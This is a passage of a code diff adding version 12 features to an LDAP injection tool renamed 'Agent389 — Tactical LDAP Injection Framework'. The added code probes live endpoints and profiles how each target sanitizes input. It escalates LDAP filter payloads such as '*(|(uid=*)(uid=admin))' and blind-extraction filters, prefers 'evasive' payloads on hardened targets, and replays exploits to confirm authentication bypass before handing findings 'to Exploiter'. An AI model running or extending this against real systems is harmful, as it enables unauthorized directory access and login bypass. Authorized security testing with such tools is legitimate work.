+
+        with self._lock:
+            self._ep_scores[ep_key] = min(
+                self._ep_scores[ep_key] + boost, 100.0)
+            if obs:
+                self._observations[ep_key].extend(obs)
+
+    def observe_rejection(self, ep_key: str) -> None:
+        """Mark that this endpoint cleanly rejected a probe (no anomaly)."""
+        with self._lock:
+            self._reject_counts[ep_key] += 1
+            # Decay: after 3 clean rejections, cut probability in half
+            if self._reject_counts[ep_key] % 3 == 0:
+                self._ep_scores[ep_key] *= 0.5
+
+    def observe_stack(self, evidence: List[str]) -> None:
+        """Feed global stack signals from Phase 0/1 into the model."""
+        with self._lock:
+            self._stack_evidence.extend(evidence)
+
+    # ── Score accessors ───────────────────────────────────────────────────────
+
+    def get_ep_score(self, ep_key: str) -> float:
+        with self._lock:
+            return self._ep_scores.get(ep_key, 0.0)
+
+    def get_observations(self, ep_key: str) -> List[str]:
+        with self._lock:
+            return list(self._observations.get(ep_key, []))
+
+    def boost_ep(self, ep_key: str, amount: float) -> None:
+        with self._lock:
+            self._ep_scores[ep_key] = min(
+                self._ep_scores.get(ep_key, 0.0) + amount, 100.0)
+
+    def prioritized_endpoints(
+        self, eps: List["Endpoint"]
+    ) -> List["Endpoint"]:
+        """Re-rank endpoints using accumulated model scores."""
+        def _model_score(ep: "Endpoint") -> float:
+            base = self.get_ep_score(ep.key)
+            # Add semantic param scores
+            for p in ep.params:
+                base += self.score_param_name(p) * 2
+            # Boost auth endpoints
+            if ep.is_auth_ep:
+                base += 15
+            return base
+
+        return sorted(eps, key=_model_score, reverse=True)
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# §V12-FDD  FEEDBACK-DRIVEN DISCOVERY — Phase 2 adaptive endpoint scoring
+# ═══════════════════════════════════════════════════════════════════════════════
+
+class FeedbackDrivenDiscovery:
+    """
+    V12 Phase 2 — Scores and re-ranks discovered endpoints using live feedback.
+
+    Algorithm:
+      1. Probe each endpoint with a benign request — observe input reflection,
+         state changes, or LDAP-suggestive response patterns.
+      2. Compute a FeedbackScore combining: reflection_score, state_score,
+         timing_score, error_score.
+      3. Re-rank endpoints so high-score ones get injection priority.
+      4. Flag endpoints showing input reflection for parameter expansion.
+    """
+
+    @dataclass
+    class FeedbackScore:
+        ep_key:          str
+        reflection:      bool   = False   # target reflects param input in response
+        state_change:    bool   = False   # new session cookie appeared
+        timing_spike:    bool   = False   # response took >2× baseline
+        error_signal:    bool   = False   # 5xx or LDAP error in body
+        total:           float  = 0.0
+
+    def __init__(self, client: "HTTPClient", cfg: "ScanConfig",
+                 budget: "AdaptiveBudgetManager"):
+        self._client = client
+        self._cfg    = cfg
+        self._budget = budget
+        self._lock   = threading.Lock()
+        self._scores: Dict[str, "FeedbackDrivenDiscovery.FeedbackScore"] = {}
+
+    def probe_endpoint(
+        self, ep: "Endpoint", model: "AdaptiveTargetModel"
+    ) -> "FeedbackDrivenDiscovery.FeedbackScore":
+        """Probe one endpoint and update AdaptiveTargetModel."""
+        score = self.FeedbackScore(ep_key=ep.key)
+
+        if not self._budget.acquire_for_phase("tier0"):
+            return score
+
+        # Use a benign but distinctive probe value so we can detect reflection
+        probe_val = f"ldapiprobe_{ep.key[:6]}"
+        data = {p: (probe_val if i == 0 else safe_val(p))
+                for i, p in enumerate(ep.params[:3])}
+
+        before_cookies: Set[str] = set(self._client._session.cookies.keys())
+        t0 = time.monotonic()
+
+        resp = self._client.send_endpoint(ep, data, phase="tier0")
+        if resp is None:
+            model.observe_rejection(ep.key)
+            return score
+
+        elapsed = time.monotonic() - t0
+        after_cookies: Set[str] = set(resp.cookies.keys()) | set(
+            self._client._session.cookies.keys())
+
+        body = resp.text or ""
+
+        # Input reflection detection
+        if probe_val in body:
+            score.reflection = True
+            score.total      += 15.0
+
+        # Session state change
+        new_c = after_cookies - before_cookies
+        if new_c:
+            score.state_change = True
+            score.total        += 10.0
+
+        # Timing spike — compare against 2× the timeout-baseline proxy
+        if elapsed > (self._cfg.timeout * 0.3):
+            score.timing_spike = True
+            score.total        += 8.0
+
+        # Error signal in body
+        if resp.status_code >= 500 or LDAP_ERRORS_RE.search(body):
+            score.error_signal = True
+            score.total        += 12.0
+
+        # Feed into model
+        model.observe_response(
+            ep_key        = ep.key,
+            resp_text     = body,
+            resp_headers  = dict(resp.headers),
+            resp_status   = resp.status_code,
+            cookies_before= before_cookies,
+            cookies_after = after_cookies,
+        )
+
+        with self._lock:
+            self._scores[ep.key] = score
+        return score
+
+    def rerank(
+        self, eps: List["Endpoint"], model: "AdaptiveTargetModel"
+    ) -> List["Endpoint"]:
+        """
+        Re-rank endpoints merging FeedbackScore + AdaptiveTargetModel score.
+        Runs probes in a thread pool (respects budget).
+        """
+        with ThreadPoolExecutor(
+            max_workers=min(self._cfg.threads, 6),
+            thread_name_prefix="fdd"
+        ) as pool:
+            futs = {pool.submit(self.probe_endpoint, ep, model): ep
+                    for ep in eps[:30]}   # probe top-30 only
+            for fut in as_completed(futs):
+                try:
+                    fut.result()
+                except Exception:
+                    pass
+
+        def _combined(ep: "Endpoint") -> float:
+            fb = self._scores.get(ep.key)
+            fb_score = fb.total if fb else 0.0
+            return ep.ldap_prob + fb_score + model.get_ep_score(ep.key)
+
+        reranked = sorted(eps, key=_combined, reverse=True)
+        expanded = self._expand_reflecting(reranked)
+        return expanded
+
+    def _expand_reflecting(
+        self, eps: List["Endpoint"]
+    ) -> List["Endpoint"]:
+        """
+        For endpoints where input is reflected, add common LDAP-relevant
+        parameter names if not already present (context-aware expansion).
+        """
+        _EXPAND_PARAMS = ["search", "query", "filter", "username",
+                          "uid", "cn", "member", "dn", "sAMAccountName"]
+        for ep in eps:
+            fb = self._scores.get(ep.key)
+            if fb and fb.reflection and len(ep.params) < 8:
+                for p in _EXPAND_PARAMS:
+                    if p not in ep.params:
+                        ep.params.append(p)
+        return eps
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# §V12-DPR  DYNAMIC PAYLOAD REFINER — Phase 3 adaptive payload complexity
+# ═══════════════════════════════════════════════════════════════════════════════
+
+class DynamicPayloadRefiner:
+    """
+    V12 Phase 3 — When a probe triggers a partial anomaly (not full confirm),
+    escalate payload complexity iteratively:
+      Level 0: wildcard probes (*)
+      Level 1: simple filter manipulation (*(objectClass=*))
+      Level 2: boolean chaining (*(|(uid=*)(uid=admin)))
+      Level 3: nested OR conditions (*(|(cn=*)(|(ou=*)(dc=*))))
+      Level 4: complex blind extraction filters
+
+    Also tracks timing deviation per escalation level.
+    """
+
+    _LEVELS: List[List[str]] = [
+        # Level 0 — minimal
+        ["*", "**"],
+        # Level 1 — basic filter
+        ["*(objectClass=*)", "*(|(objectClass=person))", ")(cn=*"],
+        # Level 2 — boolean chaining
+        ["*(|(uid=*)(uid=admin))", "admin*)(%26(|", "*(|(cn=*)(|(uid=*)))"],
+        # Level 3 — nested OR
+        ["*(|(cn=*)(|(ou=*)(dc=*)))", "*(|(objectClass=person)(|(uid=*)(cn=*)))"],
+        # Level 4 — blind extraction
+        ["*(cn=" + chr(ord('a') + i) + "*)" for i in range(3)],
+    ]
+
+    def __init__(self, client: "HTTPClient", pipeline: "DetectionPipeline",
+                 budget: "AdaptiveBudgetManager", cfg: "ScanConfig"):
+        self._client   = client
+        self._pipeline = pipeline
+        self._budget   = budget
+        self._cfg      = cfg
+
+    def refine(
+        self, ep: "Endpoint", param: str,
+        baseline: "Baseline",
+        partial_result: "DetectionResult",
+    ) -> Tuple[Optional["Payload"], Optional["DetectionResult"]]:
+        """
+        Escalate payload complexity starting from the level that triggered
+        partial_result.score. Returns the first escalation that produces
+        a full signal, or None.
+        """
+        # Choose start level based on partial score
+        if partial_result.score < 2.0:
+            start = 1
+        elif partial_result.score < 4.0:
+            start = 2
+        else:
+            start = 3
+
+        for level in range(start, len(self._LEVELS)):
+            for raw in self._LEVELS[level]:
+                if not self._budget.acquire_injection():
+                    return None, None
+
+                pl = Payload(
+                    raw       = raw,
+                    desc      = f"dpr_level{level}",
+                    technique = f"adaptive_l{level}",
+                    tier      = PayloadTier.TIER1_CORE,
+                    priority  = 8 - level,
+                )
+                data = build_injection_data(
+                    ep, param, raw, self._cfg.deterministic_suffix)
+                resp = self._client.send_endpoint(ep, data, phase="injection")
+                if resp is None:
+                    continue
+
+                t0 = time.monotonic()
+                result = self._pipeline.run(resp, baseline, pl)
+                elapsed = time.monotonic() - t0
+
+                # Timing spike at this level is itself a signal
+                if elapsed > baseline.median_time * 2.0 and not result.fired:
+                    result = DetectionResult(
+                        fired    = True,
+                        score    = 3.5,
+                        signals  = [DetectionSignal(
+                            detector  = "TimingRefiner",
+                            score     = 3.5,
+                            indicator = f"level{level}_timing_spike",
+                            evidence  = f"elapsed={elapsed:.3f}s baseline={baseline.median_time:.3f}s",
+                        )],
+                        severity = Severity.MEDIUM,
+                        evidence = f"timing_spike @level{level}",
+                    )
+
+                if result.fired and result.score >= 3.0:
+                    vprint(f"  [DPR] Level {level} escalation confirmed: {raw[:40]!r}")
+                    return pl, result
+
+        return None, None
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# §V12-TPE  TARGET PROFILER ENGINE — Phase 4 pre-injection characterization
+# ═══════════════════════════════════════════════════════════════════════════════
+
+class TargetProfilerEngine:
+    """
+    V12 Phase 4 — Before escalating injection complexity, profiles the target:
+      - Input reflection: does param value appear in response?
+      - Error verbosity: does it leak stack traces or LDAP error codes?
+      - Sanitization level: are special chars stripped or escaped?
+      - Session sensitivity: does auth state change on injection?
+
+    Produces a TargetProfile that governs Phase 4 escalation strategy:
+      LENIENT  → escalate fast, use aggressive payloads
+      MODERATE → standard escalation
+      HARDENED → slow, stealthy, evasive payloads first
+    """
+
+    @dataclass
+    class TargetProfile:
+        reflects_input:    bool  = False
+        leaks_errors:      bool  = False
+        strips_specials:   bool  = False
+        sanitizes_parens:  bool  = False
+        session_sensitive: bool  = False
+        strategy:          str   = "MODERATE"   # LENIENT|MODERATE|HARDENED
+        special_chars_safe: List[str] = field(default_factory=list)
+
+    _PROBE_SPECIALS = ["*", "(", ")", "\\", "\x00", "&", "|"]
+
+    def __init__(self, client: "HTTPClient", pipeline: "DetectionPipeline",
+                 cfg: "ScanConfig"):
+        self._client   = client
+        self._pipeline = pipeline
+        self._cfg      = cfg
+        self._cache:   Dict[str, "TargetProfilerEngine.TargetProfile"] = {}
+
+    def profile(
+        self, ep: "Endpoint", param: str, baseline: "Baseline"
+    ) -> "TargetProfilerEngine.TargetProfile":
+        """Profile a single endpoint+param. Cached per endpoint key."""
+        if ep.key in self._cache:
+            return self._cache[ep.key]
+
+        profile = self.TargetProfile()
+
+        # ── Probe 1: Input reflection ─────────────────────────────────────────
+        marker  = f"ldapi_probe_{uuid.uuid4().hex[:6]}"
+        data    = build_injection_data(ep, param, marker, self._cfg.deterministic_suffix)
+        resp    = self._client.send_endpoint(ep, data, phase="tier0")
+        if resp and marker in (resp.text or ""):
+            profile.reflects_input = True
+
+        # ── Probe 2: Error verbosity ──────────────────────────────────────────
+        err_data = build_injection_data(ep, param,
+                                        ")(invalid_filter_test", self._cfg.deterministic_suffix)
+        resp2    = self._client.send_endpoint(ep, err_data, phase="tier0")
+        if resp2 and (LDAP_ERRORS_RE.search(resp2.text or "")
+                      or resp2.status_code == 500):
+            profile.leaks_errors = True
+
+        # ── Probe 3: Special char sanitization ───────────────────────────────
+        safe_chars: List[str] = []
+        for ch in self._PROBE_SPECIALS:
+            dat  = build_injection_data(ep, param, ch, self._cfg.deterministic_suffix)
+            resp3 = self._client.send_endpoint(ep, dat, phase="tier0")
+            if resp3 and ch in (resp3.text or ""):
+                safe_chars.append(ch)  # char was NOT stripped
+        profile.special_chars_safe = safe_chars
+        profile.strips_specials    = len(safe_chars) < 3
+        profile.sanitizes_parens   = "(" not in safe_chars and ")" not in safe_chars
+
+        # ── Probe 4: Session sensitivity ─────────────────────────────────────
+        before  = set(self._client._session.cookies.keys())
+        inj_dat = build_injection_data(ep, param, "*", self._cfg.deterministic_suffix)
+        resp4   = self._client.send_endpoint(ep, inj_dat, phase="tier0")
+        if resp4:
+            after = set(resp4.cookies.keys())
+            if after - before:
+                profile.session_sensitive = True
+
+        # ── Strategy decision ─────────────────────────────────────────────────
+        hardened_signals = sum([
+            profile.strips_specials,
+            profile.sanitizes_parens,
+            not profile.leaks_errors,
+        ])
+        lenient_signals  = sum([
+            profile.reflects_input,
+            profile.leaks_errors,
+            len(safe_chars) >= 4,
+        ])
+
+        if lenient_signals >= 2:
+            profile.strategy = "LENIENT"
+        elif hardened_signals >= 2:
+            profile.strategy = "HARDENED"
+        else:
+            profile.strategy = "MODERATE"
+
+        self._cache[ep.key] = profile
+        vprint(f"  [TPE] {ep.url}:{param} → strategy={profile.strategy} "
+               f"safe_chars={safe_chars} reflect={profile.reflects_input}")
+        return profile
+
+    def strategy_payload_limit(self, profile: "TargetProfilerEngine.TargetProfile") -> int:
+        """How many T1 payloads to run based on strategy."""
+        return {"LENIENT": 12, "MODERATE": 8, "HARDENED": 5}.get(profile.strategy, 8)
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# §V12-EV  EXPLOIT VALIDATOR — Phase 5 reliability confirmation
+# ═══════════════════════════════════════════════════════════════════════════════
+
+class ExploitValidator:
+    """
+    V12 Phase 5 — Before finalizing a CONFIRMED or PROBABLE finding,
+    replays the exact payload N times and requires ≥ threshold consistency.
+    Also verifies session/auth-state persistence if the finding is a bypass.
+    Findings failing validation are downgraded to CANDIDATE.
+    """
+
+    _REPLAY_COUNT  = 3      # replays per finding
+    _MIN_HITS      = 2      # minimum consistent hits out of replays
+    _AUTH_RE       = re.compile(
+        r"logged.in|welcome|dashboard|admin|profile|authenticated",
+        re.I)
+
+    def __init__(self, client: "HTTPClient", pipeline: "DetectionPipeline",
+                 cfg: "ScanConfig", budget: "AdaptiveBudgetManager"):
+        self._client   = client
+        self._pipeline = pipeline
+        self._cfg      = cfg
+        self._budget   = budget
+
+    def validate(
+        self, f: "HandoffFinding",
+        ep: "Endpoint", baseline: "Baseline"
+    ) -> Tuple[str, int, List[str]]:
+        """
+        Replay exploit and return (new_grade, confidence, validation_notes).
+        """
+        notes: List[str] = []
+        hits             = 0
+
+        pl = Payload(
+            raw       = f.payload_raw,
+            desc      = "exploit_validation_replay",
+            technique = f.payload_technique,
+            tier      = PayloadTier.TIER1_CORE,
+        )
+
+        for attempt in range(self._REPLAY_COUNT):
+            if not self._budget.acquire_for_phase("verification"):
+                notes.append(f"Budget exhausted at replay #{attempt+1}")
+                break
+
+            data = build_injection_data(
+                ep, f.parameter_name, f.payload_raw,
+                self._cfg.deterministic_suffix)
+            resp = self._client.send_endpoint(ep, data, phase="verification")
+            if resp is None:
+                notes.append(f"Replay #{attempt+1}: no response")
+                continue
+
+            result = self._pipeline.run(resp, baseline, pl)
+            if result.fired:
+                hits += 1
+                notes.append(f"Replay #{attempt+1}: CONFIRMED (score={result.score:.1f})")
+
+                # Auth bypass persistence check
+                if "bypass" in f.payload_technique.lower() or f.is_auth_ep if hasattr(f, 'is_auth_ep') else False:
+                    if self._AUTH_RE.search(resp.text or ""):
+                        notes.append(f"Replay #{attempt+1}: auth state persists")
+                        hits += 1   # extra credit for auth state
+            else:
+                notes.append(f"Replay #{attempt+1}: no signal (score={result.score:.1f})")
+            time.sleep(0.4)
+
+        consistency = hits / max(self._REPLAY_COUNT, 1)
+        confidence  = min(100, f.reproduction_confidence + int(consistency * 30))
+
+        if hits >= self._MIN_HITS:
+            grade = f.verification_grade   # keep or upgrade
+            notes.append(f"Validation PASSED: {hits}/{self._REPLAY_COUNT} consistent replays")
+        elif hits == 1:
+            grade = VerificationGrade.PROBABLE.value
+            notes.append(f"Validation PARTIAL: downgraded to PROBABLE ({hits}/{self._REPLAY_COUNT})")
+        else:
+            grade = VerificationGrade.CANDIDATE.value
+            confidence = max(confidence - 20, 10)
+            notes.append(f"Validation FAILED: downgraded to CANDIDATE ({hits}/{self._REPLAY_COUNT})")
+
+        return grade, confidence, notes
 
 
 class ExternalEndpointLoader:
@@ -10956,6 +11851,13 @@ class ScanOrchestrator:
         self._tracer        = ExecutionTracer()
         self._liveness      = TargetLivenessChecker(cfg)
 
+        # V12 — Adaptive intelligence engines
+        self._target_model  = AdaptiveTargetModel()
+        self._fdd           = None   # set after client ready (needs budget ref)
+        self._dpr           = None   # set in injection phase
+        self._tpe           = None   # set in injection phase
+        self._ev            = None   # set in finalize
+
         # Will be set after Phase 0
         self._server_type = LDAPServerType.GENERIC.value
         self._framework   = "generic"
@@ -11287,6 +12189,20 @@ class ScanOrchestrator:
         self._handoff.raw_ldap_ports_open = intel.get("open_ports", [])
         self._handoff.ldap_server_type = self._server_type
 
+        # V12: Feed stack evidence into adaptive target model
+        stack_ev: List[str] = []
+        if self._client.waf_name:
+            stack_ev.append(f"WAF:{self._client.waf_name}")
+        if self._server_type != "generic":
+            stack_ev.append(f"LDAP_SERVER:{self._server_type}")
+        if self._handoff.raw_ldap_ports_open:
+            stack_ev.extend(f"LDAP_PORT:{p}" for p in self._handoff.raw_ldap_ports_open)
+        if self._schema_intel:
+            stack_ev.append(f"SCHEMA_ATTRS:{len(self._schema_intel)}")
+        self._target_model.observe_stack(stack_ev)
+        self._tracer.log("phase1", "target_model_seeded",
+                         f"stack_evidence={stack_ev}", outcome="ok")
+
         # Donate unused discovery budget
         self._budget.donate_unused("discovery")
 
@@ -11404,6 +12320,21 @@ class ScanOrchestrator:
 
         self._handoff.endpoints_discovered = len(normalized)
         info(f"  Endpoints: {len(normalized)} discovered, {len(scannable)} scannable")
+
+        # V12: Feedback-Driven Discovery — probe top endpoints, re-rank live
+        self._fdd = FeedbackDrivenDiscovery(self._client, self._cfg, self._budget)
+        info("  [V12] Running FeedbackDrivenDiscovery probes...")
+        self._tracer.log("phase2", "fdd_rerank", f"probing top {min(30,len(scannable))} endpoints")
+        scannable = self._fdd.rerank(scannable, self._target_model)
+
+        # V12: Apply AdaptiveTargetModel re-scoring on top of FDD
+        scannable = self._target_model.prioritized_endpoints(scannable)
+
+        # Also use AdaptiveTargetModel semantic scores to boost ldap_prob
+        for ep in scannable:
+            semantic_boost = sum(
+                self._target_model.score_param_name(p) for p in ep.params)
+            ep.ldap_prob = min(int(ep.ldap_prob + semantic_boost), 95)
 
         # ── Risk Analysis Summary (Enterprise Phase 3 Box) ───────────────────
         phase_header(3, "Risk Analysis")
@@ -11531,6 +12462,9 @@ class ScanOrchestrator:
         self._handoff.auth_endpoints_tested   = auth_count
         
         success(f"Baselines: {len(baselines)} collected (unauth={unauth_count}, auth={auth_count})")
+
+        # V12: Store baselines snapshot for exploit validator in _finalize
+        self._last_baselines = baselines
 
         return baselines, auth_tested
 
@@ -11779,6 +12713,39 @@ class ScanOrchestrator:
                 info(f"  Confidence filter: dropped {dropped} findings below {self._cfg.min_confidence}%")
             web_findings = filtered
 
+        # V12 — Exploit validation: replay CONFIRMED/PROBABLE before report
+        ev = ExploitValidator(self._client, DetectionPipeline(self._cfg),
+                               self._cfg, self._budget)
+        baselines_snap = getattr(self, '_last_baselines', {})
+        for f in web_findings:
+            if f.verification_grade not in (
+                    VerificationGrade.CONFIRMED.value,
+                    VerificationGrade.PROBABLE.value):
+                continue
+            # Find matching endpoint and baseline
+            ep_match = None
+            for ep_key, bl in baselines_snap.items():
+                if ep_key.startswith(f"{f.http_method}:{urlparse(f.endpoint_url).netloc}"):
+                    ep_match = bl
+                    break
+            if ep_match is None:
+                f.verification_steps.append("exploit_validation: no baseline available")
+                continue
+            # Build a minimal Endpoint for replay
+            ep_stub = Endpoint(
+                url    = f.endpoint_url,
+                method = f.http_method,
+                params = [f.parameter_name],
+                source = "validation",
+            )
+            new_grade, new_conf, val_notes = ev.validate(f, ep_stub, ep_match)
+            f.verification_grade   = new_grade
+            f.reproduction_confidence = new_conf
+            f.verification_steps.extend(val_notes)
+            self._tracer.log("phase5", "exploit_validation",
+                             f"{f.parameter_name}@{f.endpoint_url[:50]}",
+                             outcome=new_grade)
+
         out_path = self._serializer.emit(
             handoff      = self._handoff,
             web_findings = web_findings,
@@ -11787,22 +12754,13 @@ class ScanOrchestrator:
         )
         self._print_summary(web_findings)
 
-        # V11 — Attach execution trace to handoff
+        # V12 — Attach execution trace to handoff JSON
         trace = self._tracer.get()
         self._handoff.execution_trace = trace
 
-        # V11 — HTML Report generation
-        try:
-            html_path = os.path.join(
-                self._cfg.output_dir,
-                f"ldapi_report_{self._cfg.scan_id}.html")
-            html = HTMLReportGenerator.generate(self._handoff, trace)
-            with open(html_path, "w", encoding="utf-8") as fh:
-                fh.write(html)
-            info(f"  HTML Report: {html_path}")
-        except Exception as exc:
-            warn(f"HTML report generation failed: {exc}")
-        
+        # V12 — Write narrative audit footer
+        self._logger.write_summary_footer(self._handoff)
+
         # Cleanup checkpoint
         cp_path = os.path.realpath(
             os.path.join(self._cfg.output_dir, self._cfg.checkpoint_file))
@@ -11931,11 +12889,10 @@ class ScanOrchestrator:
         tprint()
         tprint(color("  " + "─" * 68, C.DIM))
         tprint()
-        tprint(f"  {color('Findings JSON  :', C.BCYAN, C.BOLD)} {color(self._cfg.findings_file, C.BWHITE)}")
+        tprint(f"  {color('Findings JSON  :', C.BCYAN, C.BOLD)} {color(self._cfg.findings_file, C.BGREEN + C.BOLD)}")
         tprint(f"  {color('Audit NDJSON   :', C.BCYAN, C.BOLD)} {color(self._cfg.audit_file, C.BWHITE)}")
-        tprint(f"  {color('HTML Report    :', C.BCYAN, C.BOLD)} {color('ldapi_report_' + self._cfg.scan_id + '.html', C.BGREEN + C.BOLD)}")
         trace_count = len(self._tracer.get())
-        tprint(f"  {color('Exec Trace     :', C.BCYAN, C.BOLD)} {color(str(trace_count) + ' steps logged in HTML', C.DIM)}")
+        tprint(f"  {color('Exec Trace     :', C.BCYAN, C.BOLD)} {color(str(trace_count) + ' steps in audit+JSON', C.DIM)}")
         tprint()
         section("SCAN COMPLETE")
 
@@ -11947,10 +12904,10 @@ class ScanOrchestrator:
 
 def _parse_args() -> argparse.Namespace:
     p = argparse.ArgumentParser(
-        prog="ldapi_detect",
+        prog="agent389",
         description=(
-            "LDAPi Detection Agent v10.0 — "
-            "Find -> Verify -> Handoff to Exploiter"
+            "Agent389 v12.0 — "
+            "Tactical LDAP Injection Framework"
         ),
         formatter_class=argparse.RawDescriptionHelpFormatter,
     )
